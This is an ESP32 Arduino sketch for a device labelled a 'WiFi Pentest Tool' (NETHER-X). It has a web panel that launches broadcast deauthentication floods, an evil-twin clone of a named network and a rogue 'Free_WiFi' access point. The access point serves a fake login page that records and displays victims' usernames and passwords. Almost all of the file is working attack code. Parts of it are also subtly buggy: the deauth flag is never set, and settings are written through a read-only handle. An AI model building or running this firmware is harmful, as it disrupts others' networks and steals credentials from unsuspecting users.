#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_wifi.h>

static Preferences prefs;
static WebServer server(80);
static DNSServer dns;

static String ap_ssid = "GMpro";
static String ap_pass = "Sangkur87";
static const IPAddress apIP(192, 168, 4, 1);

static bool attackOn = false;
static bool evilTwinOn = false;
static bool rogueOn = false;
static bool ledState = false;

struct Target {
  String ssid;
  String bssid;
  int ch;
  int rssi;
};

static Target targets[30];
static int targetCount = 0;
static unsigned long startTime = 0;

static void startAP() {
  Serial.println("Starting AP...");
  WiFi.disconnect(true);
  delay(200);
  WiFi.mode(WIFI_AP);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  delay(100);
  bool ok = WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
  Serial.println("AP Result: " + String(ok ? "OK" : "FAIL"));
  Serial.println("IP: " + WiFi.softAPIP().toString());
}

static void scanNetworks() {
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  int n = WiFi.scanNetworks();
  targetCount = 0;
  for (int i = 0; i < n && targetCount < 30; i++) {
    targets[targetCount].ssid = WiFi.SSID(i);
    targets[targetCount].bssid = WiFi.BSSIDstr(i);
    targets[targetCount].ch = WiFi.channel(i);
    targets[targetCount].rssi = WiFi.RSSI(i);
    targetCount++;
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_AP);
  Serial.println("Networks found: " + String(targetCount));
}

static void deauthTask(void* param) {
  Serial.println("Deauth started");
  while (attackOn) {
    for (int ch = 1; ch <= 13; ch++) {
      if (!attackOn) break;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      int n = WiFi.scanNetworks();
      for (int i = 0; i < n; i++) {
        if (!attackOn) break;
        if (WiFi.channel(i) == ch) {
          uint8_t bssid[6];
          String bssidStr = WiFi.BSSIDstr(i);
          sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
          uint8_t pkt[26] = {
            0xC0, 0x00, 0x3A, 0x01,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00
          };
          memcpy(&pkt[4], bssid, 6);
          memcpy(&pkt[16], bssid, 6);
          for (int j = 0; j < 15; j++) {
            esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
            delayMicroseconds(100);
          }
        }
      }
      WiFi.scanDelete();
      delay(5);
    }
  }
  Serial.println("Deauth stopped");
  vTaskDelete(NULL);
}

static void handleRoot() {
  String h = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>NETHER-X</title>";
  h += "<style>";
  h += "*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#111;color:#fff;min-height:100vh}";
  h += ".h{background:linear-gradient(135deg,#06f,#039);padding:20px;text-align:center}.h h1{color:#0ff;font-size:2em}";
  h += ".c{max-width:1200px;margin:0 auto;padding:20px}.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px}";
  h += ".card{background:#222;border:2px solid #06f;border-radius:10px;padding:15px}.card h2{color:#0ff;border-bottom:1px solid #06f;padding-bottom:10px;margin-bottom:10px}";
  h += "button{background:linear-gradient(135deg,#06f,#039);color:#fff;border:none;padding:10px 20px;border-radius:5px;margin:5px;cursor:pointer}";
  h += ".btn1{background:linear-gradient(135deg,#0f0,#090)}.btn2{background:linear-gradient(135deg,#f00,#900)}";
  h += "input{width:100%;padding:10px;margin:5px 0;background:#000;border:1px solid #06f;color:#fff;border-radius:5px}";
  h += "table{width:100%;border-collapse:collapse;margin-top:10px}th{background:#06f;padding:10px;text-align:left}";
  h += "td{padding:8px;border-bottom:1px solid #333}.log{background:#000;padding:10px;border:1px solid #0f0;border-radius:5px;font-family:monospace;max-height:200px;overflow-y:auto;color:#0f0}";
  h += ".on{background:#0f0;color:#000;padding:3px 10px;border-radius:10px}.off{background:#f00;color:#fff;padding:3px 10px;border-radius:10px}";
  h += ".s{display:inline-block;padding:5px 15px;border-radius:15px;font-weight:bold}";
  h += "</style></head>";
  h += "<div class='h'><h1>NETHER-X</h1><p>WiFi Pentest Tool - ESP32</p></div>";
  h += "<div class='c'><div class='g'>";
  h += "<div class='card'><h2>Status</h2>";
  h += "<p>SSID: <b>" + ap_ssid + "</b></p>";
  h += "<p>PASS: <b>" + ap_pass + "</b></p>";
  h += "<p>IP: <b>192.168.4.1</b></p>";
  h += "<p>Mode: <span class='s " + String(attackOn ? "on" : "off") + "'>" + (attackOn ? "ATTACK" : "IDLE") + "</span></p>";
  h += "<p>Clients: <b>" + String(WiFi.softAPgetStationNum()) + "</b></p>";
  h += "<p>Uptime: <b id='t'>0s</b></p>";
  h += "</div>";
  h += "<div class='card'><h2>WiFi Scanner</h2><button onclick='scan()'>Scan</button><div id='nl'></div></div>";
  h += "<div class='card'><h2>Deauth Attack</h2><button class='btn1' onclick='startD()'>Start</button><button class='btn2' onclick='stopD()'>Stop</button></div>";
  h += "<div class='card'><h2>Evil Twin</h2><input id='etS' placeholder='SSID'><input id='etC' type='number' value='1'><button onclick='setET()'>Start</button><button class='btn2' onclick='stpET()'>Stop</button></div>";
  h += "<div class='card'><h2>Rogue AP</h2><input id='rS' value='Free_WiFi'><button onclick='setR()'>Start</button><button class='btn2' onclick='stpR()'>Stop</button></div>";
  h += "<div class='card'><h2>Captured</h2><button onclick='getL()'>Refresh</button><button class='btn2' onclick='clrL()'>Clear</button><div id='lg' class='log'>No data</div></div>";
  h += "<div class='card'><h2>Settings</h2><input id='sSID' value='" + ap_ssid + "'><input id='sPASS' value='" + ap_pass + "'><button onclick='sv()'>Save</button><button class='btn2' onclick='rst()'>Reset</button></div>";
  h += "</div></div>";
  h += "<script>";
  h += "function scan(){fetch('/scan').then(r=>r.json()).then(d=>{let t='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>CH</th><th>Act</th></tr>';";
  h += "d.forEach((x,i)=>{t+='<tr><td>'+i+'</td><td>'+(x.s||'Hidden')+'</td><td>'+x.r+'</td><td>'+x.c+'</td><td><button onclick=deauth('+i+')>Deauth</button></td></tr>'});";
  h += "t+='</table>';document.getElementById('nl').innerHTML=t;});}";
  h += "function deauth(i){fetch('/d?q='+i);}";
  h += "function startD(){fetch('/ds');}";
  h += "function stopD(){fetch('/dss').then(()=>location.reload());}";
  h += "function setET(){fetch('/et?s='+encodeURIComponent(document.getElementById('etS').value)+'&c='+document.getElementById('etC').value);}";
  h += "function stpET(){fetch('/ets');}";
  h += "function setR(){fetch('/rs?s='+encodeURIComponent(document.getElementById('rS').value));}";
  h += "function stpR(){fetch('/rss');}";
  h += "function getL(){fetch('/log').then(r=>r.text()).then(d=>document.getElementById('lg').textContent=d);}";
  h += "function clrL(){fetch('/clr');getL();}";
  h += "function sv(){fetch('/sv?s='+encodeURIComponent(document.getElementById('sSID').value)+'&p='+encodeURIComponent(document.getElementById('sPASS').value)).then(()=>alert('Saved! Rebooting...'));}";
  h += "function rst(){if(confirm('Reset?'))fetch('/rst');}";
  h += "setInterval(()=>{document.getElementById('t').textContent=Math.floor(Date.now()/1000)+'s';},1000);";
  h += "scan();";
  h += "</script></body></html>";
  server.send(200, "text/html", h);
}

static void handleScan() {
  scanNetworks();
  String j = "[";
  for (int i = 0; i < targetCount; i++) {
    if (i > 0) j += ",";
    j += "{\"s\":\"" + targets[i].ssid + "\",\"b\":\"" + targets[i].bssid + "\",\"r\":" + String(targets[i].rssi) + ",\"c\":" + String(targets[i].ch) + "}";
  }
  j += "]";
  server.send(200, "application/json", j);
}

static void handleDeauthStart() {
  if (!attackOn) {
    WiFi.mode(WIFI_AP_STA);
    xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 1, NULL, 0);
  }
  server.send(200, "text/plain", "OK");
}

static void handleDeauthStop() {
  attackOn = false;
  WiFi.mode(WIFI_AP);
  server.send(200, "text/plain", "OK");
}

static void handleETStart() {
  String ssid = server.arg("s");
  int ch = server.arg("c").toInt();
  if (ssid.length() > 0) {
    evilTwinOn = true;
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    delay(100);
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
    Serial.println("Evil Twin: " + ssid);
  }
  server.send(200, "text/plain", "OK");
}

static void handleETStop() {
  evilTwinOn = false;
  dns.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

static void handleRogueStart() {
  String ssid = server.arg("s");
  if (ssid.length() > 0) {
    rogueOn = true;
    WiFi.softAPdisconnect(true);
    dns.stop();
    delay(200);
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dns.setErrorReplyCode(DNSReplyCode::NoError);
    dns.start(53, "*", apIP);
    server.on("/login", HTTP_POST, [&]() {
      String u = server.arg("user");
      String p = server.arg("pass");
      prefs.begin("netherx", true);
      String l = prefs.getString("log", "");
      l += "User:" + u + " Pass:" + p + "\n";
      prefs.putString("log", l);
      prefs.end();
      Serial.println("CAPTURED: " + u + ":" + p);
      server.send(200, "text/html", "<html><body style='background:#000;color:#0f0;padding:50px;text-align:center'><h1>Connected!</h1></body></html>");
    });
    server.onNotFound([]() {
      String html = "<html><body style='background:#000;color:#fff;padding:30px'><h1>WiFi Login</h1><form action='/login' method='post'>";
      html += "<input name='user' placeholder='Username' style='display:block;width:100%;padding:10px;margin:10px 0'><input name='pass' type='password' placeholder='Password' style='display:block;width:100%;padding:10px;margin:10px 0'>";
      html += "<button style='width:100%;padding:15px;background:#0f0;border:none'>Connect</button></form></body></html>";
      server.send(200, "text/html", html);
    });
  }
  server.send(200, "text/plain", "OK");
}

static void handleRogueStop() {
  rogueOn = false;
  dns.stop();
  server.onNotFound([]() {});
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
  server.send(200, "text/plain", "OK");
}

static void handleLogs() {
  prefs.begin("netherx", false);
  String log = prefs.getString("log", "No data");
  prefs.end();
  server.send(200, "text/plain", log);
}

static void handleClearLogs() {
  prefs.begin("netherx", true);
  prefs.putString("log", "");
  prefs.end();
  server.send(200, "text/plain", "OK");
}

static void handleSave() {
  String s = server.arg("s");
  String p = server.arg("p");
  if (s.length() > 0 && p.length() >= 8) {
    prefs.begin("netherx", true);
    prefs.putString("ssid", s);
    prefs.putString("pass", p);
    prefs.end();
    ESP.restart();
  }
  server.send(200, "text/plain", "OK");
}

static void handleReset() {
  prefs.begin("netherx", true);
  prefs.clear();
  prefs.end();
  ESP.restart();
}

static void handleCaptive() {
  server.sendHeader("Location", "http://192.168.4.1/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(500);
  
  prefs.begin("netherx", false);
  String s = prefs.getString("ssid", "");
  String p = prefs.getString("pass", "");
  if (s.length() > 0) ap_ssid = s;
  if (p.length() >= 8) ap_pass = p;
  prefs.end();
  
  Serial.println("=================================");
  Serial.println("NETHER-X v1.0");
  Serial.println("SSID: " + ap_ssid);
  Serial.println("PASS: " + ap_pass);
  Serial.println("=================================");
  
  startAP();
  
  dns.setErrorReplyCode(DNSReplyCode::NoError);
  dns.start(53, "*", apIP);
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/ds", handleDeauthStart);
  server.on("/dss", handleDeauthStop);
  server.on("/d", handleDeauthStart);
  server.on("/et", handleETStart);
  server.on("/ets", handleETStop);
  server.on("/rs", handleRogueStart);
  server.on("/rss", handleRogueStop);
  server.on("/log", handleLogs);
  server.on("/clr", handleClearLogs);
  server.on("/sv", handleSave);
  server.on("/rst", handleReset);
  server.on("/generate_204", handleCaptive);
  server.begin();
  
  startTime = millis();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  Serial.println("Ready!");
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  
  if (attackOn) {
    ledState = !ledState;
    digitalWrite(LED_BUILTIN, ledState ? HIGH : LOW);
    delay(100);
  } else if (evilTwinOn || rogueOn) {
    digitalWrite(LED_BUILTIN, HIGH);
  } else {
    digitalWrite(LED_BUILTIN, LOW);
  }
}